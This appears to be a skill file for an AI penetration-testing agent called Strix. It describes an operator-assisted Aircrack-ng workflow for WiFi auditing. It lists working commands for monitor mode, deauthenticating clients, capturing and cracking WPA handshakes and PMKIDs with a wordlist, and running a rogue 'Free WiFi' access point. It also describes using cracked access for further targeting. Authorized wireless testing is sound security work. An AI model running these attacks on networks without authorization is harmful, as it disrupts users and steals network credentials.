---
name: aircrack-ng
description: Operator-assisted Aircrack-ng workflows for wireless network auditing, WPA/WPA2 cracking, and rogue AP detection
category: tools
tags: [wireless, cracking, network, operator-assisted]
---

# Aircrack-ng

Wireless network security auditing suite for monitoring, attacking, testing, and cracking WiFi networks. Covers WEP, WPA/WPA2-PSK, and WPA Enterprise.

## When to Request

- When wireless network security is in scope
- To capture WPA/WPA2 handshakes for offline cracking
- For rogue access point detection
- When testing wireless client isolation and segmentation

## Operator-Assisted Workflow

1. Agent determines wireless testing objectives (handshake capture, client deauth, rogue AP)
2. Agent provides Aircrack-ng suite commands (monitor mode, capture, crack)
3. Operator runs wireless attacks with compatible adapter and provides results
4. Agent directs hash cracking (Hashcat mode 22000) and network access exploitation
5. Agent uses network access for further internal assessment

## Key Commands

### Enable Monitor Mode
```
airmon-ng start wlan0
```

### Scan Networks
```
airodump-ng wlan0mon
```

### Target Specific Network
```
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon
```

### Deauthentication (Force Handshake)
```
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
```

### Crack WPA Handshake
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### PMKID Capture (Clientless)
```
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hash.22000
hashcat -m 22000 hash.22000 rockyou.txt
```

### Rogue AP
```
airbase-ng -e "Free WiFi" -c 6 wlan0mon
```

## Output Analysis

- **Captured handshakes** -- crack with Aircrack-ng or Hashcat (mode 22000) for network PSK
- **PMKID hashes** -- faster capture without client deauth; crack with Hashcat
- **Connected clients** -- identify devices on target network for further targeting
- **Hidden SSIDs** -- revealed through probe request analysis
- **Network PSK cracked** -- full network access; proceed to internal assessment

## Integration with Strix

- Cracked WiFi credentials provide network access for internal web application testing
- Network topology discovered via wireless expands Strix's assessment scope
- Client devices on wireless networks become targets for further enumeration
- Wireless segmentation testing validates network architecture security
